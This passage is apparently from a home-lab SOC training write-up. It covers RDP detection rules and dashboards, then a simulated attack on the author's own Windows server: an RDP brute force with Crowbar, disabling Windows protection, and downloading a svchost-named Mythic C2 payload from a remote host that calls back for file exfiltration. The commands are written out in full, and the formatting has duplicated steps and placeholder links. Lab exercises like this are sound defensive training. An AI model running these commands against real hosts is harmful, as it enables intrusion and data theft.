- **Using Shodan**: Search for servers with exposed RDP on the default port.
  ![Shodan Search](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2043%20Creating%20an%20account%20with%20shodan%20and%20searching%20port%203389.PNG) 
- **Using Censys**: Perform the same search to verify results.
  ![Censys Search](link_to_your_image) 
  ![Censys Search](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2044%20Using%20Censys%20for%20Finding%20open%20RDP%20ports%20too.PNG) 

### 2. Monitoring Failed RDP Attempts
- Created a log query for failed RDP attempts and confirmed my own failed login.
  ![Failed RDP Log Query](link_to_your_image) <!-- Replace with actual image link -->
- Generated alerts similar to earlier SSH queries.
  ![Alert Generation](link_to_your_image) <!-- Replace with actual image link -->
  ![Failed RDP Log Query](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2045%20Saving%20a%20log%20query%20for%20Failed%20RDP%20Login%20Attempts%2C%20seeing%20my%20own%20log!.PNG) <!-- Replace with actual image link -->
- Created an alert for failed RDP attempts.
  ![Alert Generation](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2046%20Creating%20the%20Alert%20rule%20for%20failed%20RDP%20Attempts.PNG) <!-- Replace with actual image link -->
- Executed a brute force attack on my Windows server to generate an alert.
  ![Brute Force Alert](link_to_your_image) <!-- Replace with actual image link -->
  ![Brute Force Alert](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2047%20Generating%20an%20alert%20via%20brute%20force%20RDP.PNG) <!-- Replace with actual image link -->

### 3. Configuring Detection Rules
- **Detection Rule Setup**:
    - Current rules only query thresholds; need to create detection rules under **Security**.
      ![Detection Rule Setup](link_to_your_image) <!-- Replace with actual image link -->
    - Opted for preconfigured rules or created a new one to experiment.
      ![Preconfigured Rules](link_to_your_image) <!-- Replace with actual image link -->
      ![Detection Rule Setup](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2048%20This%20is%20where%20we%20make%20REAL%20alerts.PNG) <!-- Replace with actual image link -->
    - Opted for preconfigured rules or created a new one to experiment. I chose to make my own
      ![Preconfigured Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2049%20Lets%20Create%20a%20new%20rule.PNG) <!-- Replace with actual image link -->
    - Configured data involved in the new rules, mirroring the process used for SSH attempts.
      ![Configuring New Rules](link_to_your_image) <!-- Replace with actual image link -->
      ![Configuring New Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%205%20Set%20it%20to%20this%20so%20you%20can%20access%20it%20via%20SOC%20Laptop.png) <!-- Replace with actual image link -->
      ![Configuring New Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2050%20Select%20this%20type%20of%20rule.PNG) <!-- Replace with actual image link -->
      ![Configuring New Rules](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2052%20My%20new%20rules%20are%20set.PNG) <!-- Replace with actual image link -->

### 4. Data Visualization
- Created maps for new RDP data queries (following SSH attempt mapping steps).
  ![RDP Data Map](link_to_your_image) <!-- Replace with actual image link -->
- Developed tables for dashboard visualization:
    - **Failed and Successful SSH Attempts** to the exposed Ubuntu server.
      ![SSH Attempts Visualization](link_to_your_image) <!-- Replace with actual image link -->
      ![SSH Attempts Visualization](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2054%20Created%20some%20tabled%20for%20my%20dashboard%20to%20visualize%20SSH%20data%20on%20my%20linux%20server.PNG) <!-- Replace with actual image link -->
    - **RDP Activity Tracking** on the exposed Windows server.
      ![RDP Activity Table](link_to_your_image) <!-- Replace with actual image link -->
      ![RDP Activity Table]([link_to_your_image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2055%20Made%20some%20tables%20for%20the%20RDP%20activity%20on%20Windows%20Server.PNG)) <!-- Replace with actual image link -->

### 5. Attack Diagram Creation
- Created an attack diagram outlining the threat actor's process.
  ![Attack Diagram](link_to_your_image) <!-- Replace with actual image link -->
  ![Attack Diagram](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2056%20Network%20Attack%20Diagram.PNG) <!-- Replace with actual image link -->

### 6. Setting Up Mythic C2
- **Spin Up Ubuntu Server**:
    docker-compose up -d
    sudo systemctl restart docker
    ```
  ![Ubuntu Server Setup](link_to_your_image) <!-- Replace with actual image link -->
- Verified Docker status before restarting the service.
  ![Docker Status](link_to_your_image) <!-- Replace with actual image link -->
  ![Ubuntu Server Setup](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2057%20Install%20Mythic%20Github%20Repo.PNG) <!-- Replace with actual image link -->
- Checked Docker status before restarting the service.
  ![Docker Status](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2058%20run%20the%20docker%20install%20command%20in%20your%20mythic%20directory.PNG) <!-- Replace with actual image link -->

### 7. Starting Mythic
- Run the following command to start Mythic:
    ```bash
    make
    ./mythic-cli start
    ```
  ![Starting Mythic](link_to_your_image) <!-- Replace with actual image link -->
### 8. Configuring Mythic
- Tightened firewall rules, allowing exceptions for Windows and Ubuntu servers.
  ![Firewall Configuration](link_to_your_image) <!-- Replace with actual image link -->
  ![Firewall Configuration](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2059%20This%20is%20what%20my%20firewall%20looks%20like%20now%2C%20only%20allowing%20my%20windows%20and%20linux%20server%2C.PNG) <!-- Replace with actual image link -->
- Accessed Mythic web GUI:
    - Default user: `mythic_admin`
    - Find password with:
        ```bash
        cat .env | grep -i admin_password
        ```
  ![Mythic GUI Login](link_to_your_image) <!-- Replace with actual image link -->
  ![Mythic GUI Login](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2060%20Get%20your%20mythic%20admin%20password.PNG) <!-- Replace with actual image link -->
  ![Mythic GUI Login](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2061%20We're%20in%20the%20mythic%20dashboard!.PNG) <!-- Replace with actual image link -->
### 9. Preparing for the Attack
- Created a target file on the Windows VM with admin password.
  ![Target File Creation](link_to_your_image) <!-- Replace with actual image link -->
- Moved to Kali Linux's wordlists directory and prepared `rockyou.txt`:
- Created a target file on the Windows VM with admin password called "passwords.txt"
- Moved to Kali Linux machine wordlists directory and prepared `rockyou.txt`:
    ```bash
    gunzip rockyou.txt.gz
    head -n 50 rockyou.txt > ~/Documents/top_50_words.txt
    ```
  ![Preparing Wordlists](link_to_your_image) <!-- Replace with actual image link -->
  ![Preparing Wordlists](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2062%20lets%20access%20our%20wordlists%20directory.png) <!-- Replace with actual image link -->
### 10. Brute Force with Crowbar
- Added the Windows password to the wordlist for easier access.
  ![Wordlist Modification](link_to_your_image) <!-- Replace with actual image link -->
- Added the Windows password to the wordlist for easier access. This way we can simulate our attack as if someone brute forced
- Installed Crowbar:
    ```bash
    sudo apt-get install -y crowbar
    ```
  ![Crowbar Installation](link_to_your_image) <!-- Replace with actual image link -->
- **Target File Setup**: 
    - Created `target.txt` containing the public IP and username:
      ```
      155.138.220.109 Administrator
      ```
  ![Target File Setup](link_to_your_image) <!-- Replace with actual image link -->
  ![Crowbar Installation](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2064%20Crowbar%20Successfully%20installed.png) <!-- Replace with actual image link -->
- (Note, I extracted the first 50 words in rockyou.txt to a file named top_50_words.txt, this is the text file i added the windows server password into)
- **Brute Force Command**:
    ```bash
    crowbar -b RDP -u Administrator -C top_50_words.txt -s 155.138.220.109
    ```
  ![Brute Force Command](link_to_your_image) <!-- Replace with actual image link -->
  ![Brute Force Command](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2066%20Successful%20brute%20force!.png) <!-- Replace with actual image link -->
### 11. RDP Session Access
- Used `xfreerdp` to access the RDP session:
    ```bash
    xfreerdp /u:Administrator /p:Winter2024! /v:155.138.220.109
    ```
  ![Accessing RDP Session](link_to_your_image) <!-- Replace with actual image link -->
  ![Accessing RDP Session](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2067%20Successfully%20in%20the%20RDP%20session!.png) <!-- Replace with actual image link -->
- Executed commands for intelligence gathering:
    ```bash
    whoami
    ipconfig
    net user
    net group
    ```
  ![Command Execution](link_to_your_image) <!-- Replace with actual image link -->
- Turn off windows protection
- ![image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2068%20lets%20disable%20all%20the%20protection.png)
### 12. Created the payload with your installed services:
    - Ensured it calls back to the C2 server's public IP.
      [image](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2073%20put%20what%20you%20want%20in%20your%20payload%2C%20and%20make%20it%20call%20back%20to%20your%20C2%20server.PNG)

### 12. Downloading and Executing Payload
### 13. Downloading and Executing Payload
- SSH into Mythic server and download agent:
    ```bash
    ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
    ```
  ![Mythic Agent Download](link_to_your_image) <!-- Replace with actual image link -->

- Install HTTP profile:
    ```bash
    ./mythic-cli install github https://github.com/MythicC2Profiles/http
    ```
  ![HTTP Profile Installation](link_to_your_image) <!-- Replace with actual image link -->

- Created payload:
    - Ensured it calls back to the C2 server's public IP.
    - Downloaded the payload using:
- Allow port 80:
    ```bash
    Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
    ufw allow 80
    ```
  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->

### 13. Finalizing the Attack
- Allowed HTTP connection on firewall:
  - Allow port 9999:
    ```bash
    ufw allow 80
    ufw allow 9999
    ```
  ![Allowing HTTP Connection](link_to_your_image) <!-- Replace with actual image link -->
- Ran the payload on the Windows server.
  ![Payload Execution](link_to_your_image) <!-- Replace with actual image link -->
    
- run the python session:
    ```bash
    python3 -m http.server 9999
    ```
    
- Downloaded the payload onto our windows server RDP session:
    ```bash
    Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
    ```
  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->
### 14. Monitor The Connection
- Result of the payload on the Windows server.
  ![Payload Execution](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2077%20We%20can%20see%20our%20established%20session.PNG)
- Monitored Mythic GUI for established session and confirmed successful file extraction from the agent.
  ![Mythic GUI Session](link_to_your_image) <!-- Replace with actual image link -->
  ![Mythic GUI Session](https://github.com/Jacob-Brown-950/30-Day-SOC-Challenge/blob/main/Screenshots/Step%2078%20Our%20attack%20was%20successful%2C%20we%20got%20the%20file.PNG) <!-- Replace with actual image link -->

## Conclusion
This week focused on simulating a brute force RDP attack while setting up the Mythic C2 server. Key tasks included finding exposed RDP servers, configuring detection rules, and creating payloads for further exploitation.
